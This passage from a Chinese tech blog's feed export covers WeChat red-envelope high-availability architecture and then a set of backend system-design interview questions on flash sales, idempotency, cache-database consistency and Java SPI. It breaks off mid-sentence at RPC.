系统可用性影响因素</h4><p><strong>系统的可用性影响因素可分成两类：</strong></p><ul><li><p>一类计划外；</p><p>计划外包含很多因素，系统用到的所有东西都可能产生故障，都可能成功影响可用性的因素。从这个角度上来讲，可以说故障是无法避免的，系统的运作一定会产生故障，尤其是服务器有成千上万个的时候。</p></li><li><p>一类计划内。</p><p>计划内的影响因素，主要有与升级相关、运维相关的操作，以及日常的备份等。这一类影响因素，通过精细地设计方案，是可以避免对可用性造成影响的。</p></li></ul><h4 id="2-红包系统可用性设计方向-1"><a href="#2-红包系统可用性设计方向-1" class="headerlink" title="2 - 红包系统可用性设计方向"></a>2 - 红包系统可用性设计方向</h4><p>基于上面两个分析结论，可以总结出红包系统的可用性的设计方向。</p><blockquote><p>1.在不能避免意外故障的情况下，尽可能降低出现意外故障时对可用性的影响。</p><p>2.绝大多数计划内的日常维护可以通过方案的设计避免影响可用性，其中平行扩容特指关于存储层的平行扩容。</p></blockquote><p>下面从降低故障影响和微信红包系统的平行扩容两方面进行分析。</p><p>首先是降低意外故障的影响，重点讲解订单存储层在订单 DB 故障的情况下如何降低对红包系统可用性的影响。</p><h4 id="3-业务逻辑层-部署方案设计-1"><a href="#3-业务逻辑层-部署方案设计-1" class="headerlink" title="3 - 业务逻辑层 - 部署方案设计"></a>3 - 业务逻辑层 - 部署方案设计</h4><p>首先是业务逻辑层的部署方案。业务逻辑层是无状态的，微信红包系统的业务逻辑层，部署在两个城市，即两地部署，每一个城市部署至少三个园区，即三个 IDC。并且每个服务需要保证三个 IDC 的部署均衡。另外，三个 IDC 总服务能力需要冗余三分之一，当一个 IDC 出现故障时，服务能力仍然足够。从而达到 IDC 故障不会对可用性产生影响。</p><h4 id="4-业务逻辑层-异步化设计-1"><a href="#4-业务逻辑层-异步化设计-1" class="headerlink" title="4 - 业务逻辑层 - 异步化设计"></a>4 - 业务逻辑层 - 异步化设计</h4><p>如下图所示，微信红包的某些步骤不实时完成也不会影响用户对红包业务可用性的体验。</p><p>比如拆红包，正常的业务流程很长，但关键步骤只有订单相关的几步。</p><p>至于转零钱、写红包记录等操作不需要实时。</p><p>用户抢到红包时，一般不会实时去钱包查看微信零钱，而是在微信群中点开消息查看本次抢到金额和他人抢红包金额。</p><p>所以拆红包时只需要从 cache 查询用户是否拆过红包，然后写入拆红包的订单记录，更新发红包订单，其他的操作都可以异步化。</p><p>当然，不是每个业务都可以进行异步化设计，需要进行业务分析，判断是否存在非关键步骤之外的事情可以将其异步化，并通过异步对账保证最终一致。</p><p>经过上述分析之后，可以采用如下思路与方案：</p><blockquote><p>实现思路：</p><p>1.最简关键路径：简化发红包、拆红包核心流程路径，重点关注与订单相关流程。</p><p>2.快慢分离：将核心流程与其他非关键步骤分离。</p><p>方案：</p><p>1.写用户记录、零钱入账使用MQ异步执行</p><p>2.增加对帐机制保障最终一致。</p></blockquote><p><img src="/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/11.png"><br>如上图所示，微信红包的某些步骤不实时完成也不会影响用户对红包业务可用性的体验。</p><p>比如拆红包，正常的业务流程很长，但关键步骤只有订单相关的几步。</p><p>至于转零钱、写红包记录等操作不需要实时。</p><p>用户抢到红包时，一般不会实时去钱包查看微信零钱，而是在微信群中点开消息查看本次抢到金额和他人抢红包金额。</p><p>所以拆红包时只需要从 cache 查询用户是否拆过红包，然后写入拆红包的订单记录，更新发红包订单，其他的操作都可以异步化。</p><p>当然，不是每个业务都可以进行异步化设计，需要进行业务分析，判断是否存在非关键步骤之外的事情可以将其异步化，并通过异步对账保证最终一致。</p><blockquote><p>以上内容比较复杂，架构团队会录制成为架构视频， 帮助大家做架构拿高薪。</p></blockquote><h4 id="5-订单存储层-故障自愈-1"><a href="#5-订单存储层-故障自愈-1" class="headerlink" title="5 - 订单存储层 - 故障自愈"></a>5 - 订单存储层 - 故障自愈</h4><p>为解决 DB 间的相互影响，需要将 DB 间相互隔离，订单存储层 SET 化。</p><p>SET 化指订单 DB 和订单接入 SERVER 垂直 stick 一起。业务逻辑层访问订单时，根据订单倒数第二、三位数字找到所属订单 SET，一个 SET 的请求不能路由到其他 SET。</p><p>通过 SET 化得到的好处是，控制 DB 连接数、隔离故障影响和分流并发。</p><p><img src="/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/10.png"><br>如上图所示，所设尾号 90-99 的 SET 故障时，如果业务逻辑服务后续不再生成属于这个 SET 的订单，那后续的业务就可以逐渐恢复。</p><p>也就是在发生故障时，业务逻辑层发布一个版本，屏蔽故障号段的单号生成，就可以恢复业务。</p><p>进一步想，除了人为发版本，有没有方法可以让 DB 故障时自动恢复？</p><p>在 DB 故障导致业务失败时，业务逻辑层可获取到故障 DB 的号段，在发红包时，将这些故障的号段，换一个可用的号段就可恢复业务。</p><p>订单号除了最后三位，前面的部分已能保证该红包唯一性，后面的数字只代表着分库表信息，故障时只需要将最后三位换另外一个 SET 便可自动恢复。</p><p>完成这个设计后，即使 DB 出现故障，业务的可用性也不会有影响。</p><p>这里还有一点，新的发红包请求可避免 DB 故障的影响，但那些故障之前已发出未被领取的红包，红包消息已发送到微信群，单号已确定，拆红包时还是失败。</p><p>对这种情况，由于不会有增量，采用正常的主备切换解决即可。</p><h4 id="6-订单存储层-平行扩容设计-1"><a href="#6-订单存储层-平行扩容设计-1" class="headerlink" title="6 - 订单存储层 - 平行扩容设计"></a>6 - 订单存储层 - 平行扩容设计</h4><p>红包系统的高可用架构设计，主要包括了部署设计、SET 化设计、异步化设计、DB 故障自愈能力建设、平行扩容设计。</p><blockquote><p>以上内容比较复杂，架构团队会录制成为架构视频， 帮助大家做架构拿高薪。</p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>红包系统是一个高并发的资金交易系统，最大的技术挑战是保障并发性能与资金安全。</p><p>这种全新的技术挑战，传统的“秒杀”系统设计方案已不能完全解决。</p><p>在分析了业界“秒杀”系统解决方案的基础上，红包系统采用了 SET 化、请求排队串行化、双维度分库表等设计，形成了独特的高并发、资金安全系统解决方案。</p><h2 id="说在最后：有问题找老架构取经"><a href="#说在最后：有问题找老架构取经" class="headerlink" title="说在最后：有问题找老架构取经"></a>说在最后：有问题找老架构取经</h2><p>超高并发红包架构，一定是一个超级牛掰的简历亮点项目，黄金项目，稍微晚点把全量的架构方案和视频进行发布。</p><p>这个项目写入简历，面试的时候如果大家能对答如流，如数家珍，基本上 面试官会被你 震惊到、吸引到。</p><p>最终，<strong>让面试官爱到 “不能自已、口水直流”</strong>。offer， 也就来了。</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>场景设计面试题</title>
      
      <link href="/2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
      <url>/2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="有A、B两个大文件，每个文件几十G，而内存只有4G，其中A文件存放学号-姓名，而B文件存放学号-分数，要求生成文件C，存放姓名和分数。怎么实现？"><a href="#有A、B两个大文件，每个文件几十G，而内存只有4G，其中A文件存放学号-姓名，而B文件存放学号-分数，要求生成文件C，存放姓名和分数。怎么实现？" class="headerlink" title="有A、B两个大文件，每个文件几十G，而内存只有4G，其中A文件存放学号+姓名，而B文件存放学号+分数，要求生成文件C，存放姓名和分数。怎么实现？"></a>有A、B两个大文件，每个文件几十G，而内存只有4G，其中A文件存放学号+姓名，而B文件存放学号+分数，要求生成文件C，存放姓名和分数。怎么实现？</h2><ul><li>hash(学号)%1000，A到a0….a1000,B到b0~b1000</li><li>学号相同的人一定hash到相同序号的小文件</li><li>加载序号相同的小文件（比如：读取a2和b2）用map储存再按姓名+分数写入C即可</li></ul><h2 id="秒杀系统怎么设计"><a href="#秒杀系统怎么设计" class="headerlink" title="秒杀系统怎么设计"></a>秒杀系统怎么设计</h2><h3 id="秒杀存在的问题"><a href="#秒杀存在的问题" class="headerlink" title="秒杀存在的问题"></a>秒杀存在的问题</h3><ul><li>高并发、瞬间请求量极大</li><li>黄牛、黑客恶意请求</li><li>链接暴露问题</li><li>数据库压力问题</li><li>库存不足和超卖问题</li></ul><h3 id="如何解决这些问题"><a href="#如何解决这些问题" class="headerlink" title="如何解决这些问题"></a>如何解决这些问题</h3><ul><li>页面静态化<ul><li>秒杀活动的页面，大多数内容都是固定不变的，如商品名称，商品图片等等，可以对活动页面做静态化处理，减少访问服务端的请求。秒杀用户会分布在全国各地，有的在上海，有的在深圳，地域相差很远，网速也各不相同。为了让用户最快访问到活动页面，可以使用CDN（Content Delivery Network，内容分发网络）。CDN可以让用户就近获取所需内容。</li></ul></li><li>按钮至灰控制<ul><li>秒杀活动开始前，按钮一般需要置灰的。只有时间到了，才能变得可以点击。这是防止，秒杀用户在时间快到的前几秒，疯狂请求服务器，然后秒杀时间点还没到，服务器就自己挂了。</li></ul></li><li>服务单一职责<ul><li>我们都知道微服务设计思想，也就是把各个功能模块拆分，功能那个类似的放一起，再用分布式的部署方式。</li><li>如用户登录相关的，就设计个用户服务，订单相关的就搞个订单服务，再到礼物相关的就搞个礼物服务等等。那么，秒杀相关的业务逻辑也可以放到一起，搞个秒杀服务，单独给它搞个秒杀数据库。</li><li>服务单一职责有个好处：如果秒杀没抗住高并发的压力，秒杀库崩了，服务挂了，也不会影响到系统的其他服务。</li></ul></li><li>秒杀链接加盐<ul><li>链接如果明文暴露的话，会有人获取到请求Url，提前秒杀了。因此，需要给秒杀链接加盐。可以把URL动态化，如通过MD5加密算法加密随机的字符串去做url。</li></ul></li><li>限流<ul><li>一般有两种方式限流：nginx限流和redis限流。</li><li>为了防止某个用户请求过于频繁，我们可以对同一用户限流；</li><li>为了防止黄牛模拟几个用户请求，我们可以对某个IP进行限流；</li><li>为了防止有人使用代理，每次请求都更换IP请求，我们可以对接口进行限流。</li><li>为了防止瞬时过大的流量压垮系统，还可以使用阿里的Sentinel、Hystrix组件进行限流。</li></ul></li><li>分布式锁<ul><li>可以使用redis分布式锁解决超卖问题。</li><li>使用Redis的SET EX PX NX + 校验唯一随机值,再删除释放锁。</li><li>为了更严谨，一般也是用lua脚本代替。lua脚本如下：</li></ul></li><li>MQ异步处理<ul><li>如果瞬间流量特别大，可以使用消息队列削峰，异步处理。用户请求过来的时候，先放到消息队列，再拿出来消费。</li></ul></li><li>限流&amp;降级&amp;熔断<ul><li>限流，就是限制请求，防止过大的请求压垮服务器；</li><li>降级，就是秒杀服务有问题了，就降级处理，不要影响别的服务；</li><li>熔断，服务有问题就熔断，一般熔断降级是一起出现。</li></ul></li></ul><h2 id="产品上线出问题怎么定位错误"><a href="#产品上线出问题怎么定位错误" class="headerlink" title="产品上线出问题怎么定位错误"></a>产品上线出问题怎么定位错误</h2><ul><li>复现问题</li><li>top jstack</li></ul><h2 id="大量并发查询用户商品信息，MySQL压力大查询慢，保证速度怎么优化方案"><a href="#大量并发查询用户商品信息，MySQL压力大查询慢，保证速度怎么优化方案" class="headerlink" title="大量并发查询用户商品信息，MySQL压力大查询慢，保证速度怎么优化方案"></a>大量并发查询用户商品信息，MySQL压力大查询慢，保证速度怎么优化方案</h2><p>读写分离</p><h2 id="海量日志数据，提取出某日访问百度次数最多的那个IP。"><a href="#海量日志数据，提取出某日访问百度次数最多的那个IP。" class="headerlink" title="海量日志数据，提取出某日访问百度次数最多的那个IP。"></a>海量日志数据，提取出某日访问百度次数最多的那个IP。</h2><ul><li>可以考虑采用“分而治之”的思想，按照IP地址的Hash(IP)%1024值，把海量IP日志分别存储到1024个小文件中。这样，每个小文件最多包含4MB个IP地址</li><li>对于每一个小文件，可以构建一个IP为key，出现次数为value的Hash map，同时记录当前出现次数最多的那个IP地址</li><li>可以得到1024个小文件中的出现次数最多的IP，再依据常规的排序算法得到总体上出现次数最多的IP；</li></ul><h2 id="给定a、b两个文件，各存放50亿个url，每个url各占64字节，内存限制是4G，让你找出a、b文件共同的url？"><a href="#给定a、b两个文件，各存放50亿个url，每个url各占64字节，内存限制是4G，让你找出a、b文件共同的url？" class="headerlink" title="给定a、b两个文件，各存放50亿个url，每个url各占64字节，内存限制是4G，让你找出a、b文件共同的url？"></a>给定a、b两个文件，各存放50亿个url，每个url各占64字节，内存限制是4G，让你找出a、b文件共同的url？</h2><h3 id="方案1"><a href="#方案1" class="headerlink" title="方案1"></a>方案1</h3><ul><li>遍历文件a，对每个url求取hash(url)%1000，然后根据所取得的值将url分别存储到1000个小文件（记为a0,a1,…,a999）中。这样每个小文件的大约为300M。</li><li>遍历文件b，采取和a相同的方式将url分别存储到1000小文件（记为b0,b1,…,b999）。这样处理后，所有可能相同的url都在对应的小文件（a0vsb0,a1vsb1,…,a999vsb999）中，不对应的小文件不可能有相同的url。然后我们只要求出1000对小文件中相同的url即可。</li><li>求每对小文件中相同的url时，可以把其中一个小文件的url存储到hash_set中。然后遍历另一个小文件的每个url，看其是否在刚才构建的hash_set中，如果是，那么就是共同的url，存到文件里面就可以了。</li></ul><h3 id="方案2"><a href="#方案2" class="headerlink" title="方案2"></a>方案2</h3><p>如果允许有一定的误差，使用布隆过滤器</p><h2 id="一般内存不足而需要分析的数据又很大的问题都可以使用分治的思想，将数据hash-x-1000分为小文件再分别加载小文件到内存中处理即可"><a href="#一般内存不足而需要分析的数据又很大的问题都可以使用分治的思想，将数据hash-x-1000分为小文件再分别加载小文件到内存中处理即可" class="headerlink" title="一般内存不足而需要分析的数据又很大的问题都可以使用分治的思想，将数据hash(x)%1000分为小文件再分别加载小文件到内存中处理即可"></a>一般内存不足而需要分析的数据又很大的问题都可以使用分治的思想，将数据hash(x)%1000分为小文件再分别加载小文件到内存中处理即可</h2><h2 id="如何保证接口的幂等性"><a href="#如何保证接口的幂等性" class="headerlink" title="如何保证接口的幂等性"></a>如何保证接口的幂等性</h2><h3 id="什么是幂等性"><a href="#什么是幂等性" class="headerlink" title="什么是幂等性"></a>什么是幂等性</h3><p>幂等性是系统服务对外一种承诺，承诺只要调用接口成功，外部多次调用对系统的影响是一致的。声明为幂等的服务会认为外部调用失败是常态，并且失败之后必然会有重试。</p><h3 id="什么情况下需要幂等"><a href="#什么情况下需要幂等" class="headerlink" title="什么情况下需要幂等"></a>什么情况下需要幂等</h3><p>以SQL为例：</p><ul><li>SELECT col1 FROM tab1 WHER col2&#x3D;2，无论执行多少次都不会改变状态，是天然的幂等。</li><li>UPDATE tab1 SET col1&#x3D;1 WHERE col2&#x3D;2，无论执行成功多少次状态都是一致的，因此也是幂等操作。</li><li>UPDATE tab1 SET col1&#x3D;col1+1 WHERE col2&#x3D;2，每次执行的结果都会发生变化，这种不是幂等的。</li><li>insert into user(userid,name) values(1,’a’) 如userid为唯一主键，即重复操作上面的业务，只会插入一条用户数据，具备幂等性。<ul><li>如userid不是主键，可以重复，那上面业务多次操作，数据都会新增多条，不具备幂等性。</li></ul></li><li>delete from user where userid&#x3D;1，多次操作，结果一样，具备幂等性</li></ul><h3 id="如何保证幂等"><a href="#如何保证幂等" class="headerlink" title="如何保证幂等"></a>如何保证幂等</h3><h4 id="1、token机制"><a href="#1、token机制" class="headerlink" title="1、token机制"></a>1、token机制</h4><ul><li>服务端提供了发送token的接口。我们在分析业务的时候，哪些业务是存在幂等问题的，就必须在执行业务前，先去获取token，服务器会把token保存到redis中。</li><li>然后调用业务接口请求时，把token携带过去，一般放在请求头部。</li><li>服务器判断token是否存在redis中，存在表示第一次请求，然后删除token,继续执行业务。</li><li>如果判断token不存在redis中，就表示是重复操作，直接返回重复标记给client，这样就保证了业务代码，不被重复执行。</li></ul><p><strong>关键点 先删除token，还是后删除token。</strong></p><p>后删除token：如果进行业务处理成功后，删除redis中的token失败了，这样就导致了有可能会发生重复请求，因为token没有被删除。这个问题其实是数据库和缓存redis数据不一致问题，后续会写文章进行讲解。</p><p>先删除token：如果系统出现问题导致业务处理出现异常，业务处理没有成功，接口调用方也没有获取到明确的结果，然后进行重试，但token已经删除掉了，服务端判断token不存在，认为是重复请求，就直接返回了，无法进行业务处理了。</p><p>先删除token可以保证不会因为重复请求，业务数据出现问题。出现业务异常，可以让调用方配合处理一下，重新获取新的token，再次由业务调用方发起重试请求就ok了。</p><p><strong>token机制缺点</strong></p><p>业务请求每次请求，都会有额外的请求（一次获取token请求、判断token是否存在的业务）。其实真实的生产环境中，1万请求也许只会存在10个左右的请求会发生重试，为了这10个请求，我们让9990个请求都发生了额外的请求。</p><h4 id="2、乐观锁机制"><a href="#2、乐观锁机制" class="headerlink" title="2、乐观锁机制"></a>2、乐观锁机制</h4><ul><li>这种方法适合在更新的场景中，update t_goods set count &#x3D; count -1 , version &#x3D; version + 1 where good_id&#x3D;2 and version &#x3D; 1</li><li>根据version版本，也就是在操作库存前先获取当前商品的version版本号，然后操作的时候带上此version号。我们梳理下，我们第一次操作库存时，得到version为1，调用库存服务version变成了2；但返回给订单服务出现了问题，订单服务又一次发起调用库存服务，当订单服务传如的version还是1，再执行上面的sql语句时，就不会执行；因为version已经变为2了，where条件就不成立。这样就保证了不管调用几次，只会真正的处理一次。</li><li>乐观锁主要使用于处理读多写少的问题</li></ul><h4 id="3、唯一主键"><a href="#3、唯一主键" class="headerlink" title="3、唯一主键"></a>3、唯一主键</h4><p>这个机制是利用了数据库的主键唯一约束的特性，解决了在insert场景时幂等问题。但主键的要求不是自增的主键，这样就需要业务生成全局唯一的主键。</p><p>如果是分库分表场景下，路由规则要保证相同请求下，落地在同一个数据库和同一表中，要不然数据库主键约束就不起效果了，因为是不同的数据库和表主键不相关</p><h4 id="4、防重表"><a href="#4、防重表" class="headerlink" title="4、防重表"></a>4、防重表</h4><p>使用订单号orderNo做为去重表的唯一索引，把唯一索引插入去重表，再进行业务操作，且他们在同一个事务中。这个保证了重复请求时，因为去重表有唯一约束，导致请求失败，避免了幂等问题。这里要注意的是，去重表和业务表应该在同一库中，这样就保证了在同一个事务，即使业务操作失败了，也会把去重表的数据回滚。这个很好的保证了数据一致性。</p><h4 id="5、唯一ID"><a href="#5、唯一ID" class="headerlink" title="5、唯一ID"></a>5、唯一ID</h4><p>调用接口时，生成一个唯一id，redis将数据保存到集合中（去重），存在即处理过。</p><h2 id="缓存和数据库不一致问题"><a href="#缓存和数据库不一致问题" class="headerlink" title="缓存和数据库不一致问题"></a>缓存和数据库不一致问题</h2><h3 id="更新缓存和更新数据库"><a href="#更新缓存和更新数据库" class="headerlink" title="更新缓存和更新数据库"></a>更新缓存和更新数据库</h3><p>大部分观点认为，做缓存不应该是去更新缓存，而是应该删除缓存，然后由下个请求去去缓存，发现不存在后再读取数据库，写入缓存。观点引用：《分布式之数据库和缓存双写一致性方案解析》孤独烟</p><p>原因一：线程安全角度同时有请求A和请求B进行更新操作，那么会出现（1）线程A更新了数据库（2）线程B更新了数据库（3）线程B更新了缓存（4）线程A更新了缓存这就出现请求A更新缓存应该比请求B更新缓存早才对，但是因为网络等原因，B却比A更早更新了缓存。这就导致了脏数据，因此不考虑。</p><p>原因二：业务场景角度有如下两点：</p><ol><li>如果你是一个写数据库场景比较多，而读数据场景比较少的业务需求，采用这种方案就会导致，数据压根还没读到，缓存就被频繁的更新，浪费性能。</li><li>如果你写入数据库的值，并不是直接写入缓存的，而是要经过一系列复杂的计算再写入缓存。那么，每次写入数据库后，都再次计算写入缓存的值，无疑是浪费性能的。显然，删除缓存更为适合。</li></ol><h3 id="删缓存和更新数据库"><a href="#删缓存和更新数据库" class="headerlink" title="删缓存和更新数据库"></a>删缓存和更新数据库</h3><h4 id="先删缓存，再更新数据库"><a href="#先删缓存，再更新数据库" class="headerlink" title="先删缓存，再更新数据库"></a>先删缓存，再更新数据库</h4><p>该方案会导致请求数据不一致同时有一个请求A进行更新操作，另一个请求B进行查询操作。那么会出现如下情形:</p><ol><li>请求A进行写操作，删除缓存</li><li>请求B查询发现缓存不存在</li><li>请求B去数据库查询得到旧值</li><li>请求B将旧值写入缓存</li><li>请求A将新值写入数据库上述情况就会导致不一致的情形出现。<br>而且，如果不采用给缓存设置过期时间策略，该数据永远都是脏数据。</li></ol><h4 id="先更新数据库，再删缓存"><a href="#先更新数据库，再删缓存" class="headerlink" title="先更新数据库，再删缓存"></a>先更新数据库，再删缓存</h4><p>这种情况不存在并发问题么？不是的。假设这会有两个请求，一个请求A做查询操作，一个请求B做更新操作，那么会有如下情形产生</p><ol><li>缓存刚好失效</li><li>请求A查询数据库，得一个旧值</li><li>请求B将新值写入数据库</li><li>请求B删除缓存</li><li>请求A将查到的旧值写入缓存ok，如果发生上述情况，确实是会发生脏数据。 然而，发生这种情况的概率又有多少呢？发生上述情况有一个先天性条件，就是步骤（3）的写数据库操作比步骤（2）的读数据库操作耗时更短，才有可能使得步骤（4）先于步骤（5）。可是，大家想想，数据库的读操作的速度远快于写操作的（不然做读写分离干嘛，做读写分离的意义就是因为读操作比较快，耗资源少），因此步骤（3）耗时比步骤（2）更短，这一情形很难出现。</li></ol><p>先更新数据库，再删缓存依然会有问题，不过，问题出现的可能性会因为上面说的原因，变得比较低！(补充说明：我用了“先更新数据库，再删缓存”且不设过期时间策略，会不会有问题呢？由于先缓存和更新数据库不是原子的，如果更新了数据库，程序歇逼，就没删缓存，由于没有过期策略，就永远脏数据了。)所以，如果你想实现基础的缓存数据库双写一致的逻辑，那么在大多数情况下，在不想做过多设计，增加太大工作量的情况下，请先更新数据库，再删缓存!</p><h3 id="数据库和缓存数据强一致怎么办"><a href="#数据库和缓存数据强一致怎么办" class="headerlink" title="数据库和缓存数据强一致怎么办"></a>数据库和缓存数据强一致怎么办</h3><p>没有办法做到绝对的一致性，这是由CAP理论决定的，缓存系统适用的场景就是非强一致性的场景，所以它属于CAP中的AP。所以，我们得委曲求全，可以去做到BASE理论中说的最终一致性。</p><p>大佬们给出了到达最终一致性的解决思路，主要是针对上面两种双写策略（先删缓存，再更新数据库&#x2F;先更新数据库，再删缓存）导致的脏数据问题，进行相应的处理，来保证最终一致性。</p><h4 id="缓存延时双删"><a href="#缓存延时双删" class="headerlink" title="缓存延时双删"></a>缓存延时双删</h4><p>步骤</p><ol><li>先删除缓存</li><li>再写数据库</li><li>休眠500毫秒（根据具体的业务时间来定）</li><li>再次删除缓存。</li></ol><h4 id="那么，这个休眠500毫秒怎么确定的，具体该休眠多久呢？"><a href="#那么，这个休眠500毫秒怎么确定的，具体该休眠多久呢？" class="headerlink" title="那么，这个休眠500毫秒怎么确定的，具体该休眠多久呢？"></a>那么，这个休眠500毫秒怎么确定的，具体该休眠多久呢？</h4><p>针对上面的情形，读者应该自行评估自己的项目的读数据业务逻辑的耗时。然后写数据的休眠时间则在读数据业务逻辑的耗时基础上，加几百ms即可。这么做的目的，就是确保读请求结束，写请求可以删除读请求造成的缓存脏数据。</p><h4 id="如果你用了mysql的读写分离架构怎么办？"><a href="#如果你用了mysql的读写分离架构怎么办？" class="headerlink" title="如果你用了mysql的读写分离架构怎么办？"></a>如果你用了mysql的读写分离架构怎么办？</h4><p>ok，在这种情况下，造成数据不一致的原因如下，还是两个请求，一个请求A进行更新操作，另一个请求B进行查询操作。</p><ol><li>请求A进行写操作，删除缓存</li><li>请求A将数据写入数据库了，</li><li>请求B查询缓存发现，缓存没有值</li><li>请求B去从库查询，这时，还没有完成主从同步，因此查询到的是旧值</li><li>请求B将旧值写入缓存</li><li>数据库完成主从同步，从库变为新值上述情形，就是数据不一致的原因。还是使用双删延时策略。只是，睡眠时间修改为在主从同步的延时时间基础上，加几百ms。</li></ol><h4 id="采用这种同步淘汰策略，吞吐量降低怎么办？"><a href="#采用这种同步淘汰策略，吞吐量降低怎么办？" class="headerlink" title="采用这种同步淘汰策略，吞吐量降低怎么办？"></a>采用这种同步淘汰策略，吞吐量降低怎么办？</h4><p>ok，那就将第二次删除作为异步的。自己起一个线程，异步删除。这样，写的请求就不用沉睡一段时间后了，再返回。这么做，加大吞吐量。</p><h4 id="删缓存失败了怎么办：重试机制"><a href="#删缓存失败了怎么办：重试机制" class="headerlink" title="删缓存失败了怎么办：重试机制"></a>删缓存失败了怎么办：重试机制</h4><p>看似问题都已经解决了，但其实，还有一个问题没有考虑到，那就是删除缓存的操作，失败了怎么办？比如延时双删的时候，第二次缓存删除失败了，那不还是没有清除脏数据吗？解决方案就是再加上一个重试机制，保证删除缓存成功</p><p>流程如下所示</p><ol><li>更新数据库数据；</li><li>缓存因为种种问题删除失败</li><li>将需要删除的key发送至消息队列</li><li>自己消费消息，获得需要删除的key</li><li>继续重试删除操作，直到成功然而，</li></ol><p>该方案有一个缺点，对业务线代码造成大量的侵入。</p><p>于是有了方案二，在方案二中，启动一个订阅程序去订阅数据库的binlog，获得需要操作的数据。在应用程序中，另起一段程序，获得这个订阅程序传来的信息，进行删除缓存操作</p><h4 id="binlog"><a href="#binlog" class="headerlink" title="binlog"></a>binlog</h4><p>流程如下所示</p><ol><li>更新数据库数据</li><li>数据库会将操作信息写入binlog日志当中</li><li>订阅程序提取出所需要的数据以及key</li><li>另起一段非业务代码，获得该信息</li><li>尝试删除缓存操作，发现删除失败</li><li>将这些信息发送至消息队列</li><li>重新从消息队列中获得该数据，重试操作。</li></ol><h2 id="什么是SPI"><a href="#什么是SPI" class="headerlink" title="什么是SPI"></a>什么是SPI</h2><p>SPI 全称为 (Service Provider Interface) ，是JDK内置的一种服务提供发现机制</p><h3 id="SPI-实践"><a href="#SPI-实践" class="headerlink" title="SPI 实践"></a>SPI 实践</h3><p>接下来我们来如何来利用 SPI 实现刚才提到的可拔插 IOC 容器。</p><p>既然刚才都提到了 SPI 的本质就是面向接口编程，所以自然我们首先需要定义一个接口：</p><p><img src="/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/1.png" alt="SPI图"></p><p>其中包含了一些 Bean 容器所必须的操作：注册、获取、释放 bean。</p><p>为了让其他人也能实现自己的 IOC 容器，所以我们将这个接口单独放到一个 Module 中，可供他人引入实现。</p><p><img src="/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/2.png"></p><p>所以当我要实现一个单例的 IOC 容器时，我只需要新建一个 Module 然后引入刚才的模块并实现 CicadaBeanFactory 接口即可。</p><p>当然其中最重要的则是需要在 resources 目录下新建一个 META-INF&#x2F;services&#x2F;top.crossoverjie.cicada.base.bean.CicadaBeanFactory 文件，文件名必须得是我们之前定义接口的全限定名（SPI 规范）。<br><img src="/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/3.png"></p><p>其中的内容便是我们自己实现类的全限定名：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">top.crossoverjie.cicada.bean.ioc.CicadaIoc</span><br></pre></td></tr></table></figure><p>可以想象最终会通过这里的全限定名来反射创建对象。</p><p>只不过这个过程 Java 已经提供 API 屏蔽掉了：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> CicadaBeanFactory <span class="title function_">getCicadaBeanFactory</span><span class="params">()</span> &#123;</span><br><span class="line">    ServiceLoader&lt;CicadaBeanFactory&gt; cicadaBeanFactories = ServiceLoader.load(CicadaBeanFactory.class);</span><br><span class="line">    <span class="keyword">if</span> (cicadaBeanFactories.iterator().hasNext())&#123;</span><br><span class="line">        <span class="keyword">return</span> cicadaBeanFactories.iterator().next() ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CicadaDefaultBean</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当 classpath 中存在我们刚才的实现类（引入实现类的 jar 包），便可以通过 java.util.ServiceLoader 工具类来找到所有的实现类（可以有多个实现类同时存在，只不过通常我们只需要一个）。</p><p>一些都准备好之后，使用自然就非常简单了。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>top.crossoverjie.opensource<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cicada-ioc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们只需要引入这个依赖便能使用它的实现，当我们想换一种实现方式时只需要更换一个依赖即可。</p><p>这样就做到了不修改一行代码灵活的可拔插选择 IOC 容器了。</p><p>SPI 的一些其他应用</p><p>MySQL 的驱动包也是利用 SPI 来实现自己的连接逻辑。</p><p><img src="/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/4.png"></p><p>总结来说：</p><ul><li>提供一个接口</li><li>在resource下新建META-INF&#x2F;services目录，在目录下新建接口的全限定名文件</li><li>服务方实现接口</li><li>调用ServiceLoad.load()</li></ul><h2 id="什么是RPC？"><a href="#什么是RPC？" class="headerlink" title="什么是RPC？"></a>什么是RPC？</h2><p>RPC（Remote Procedure 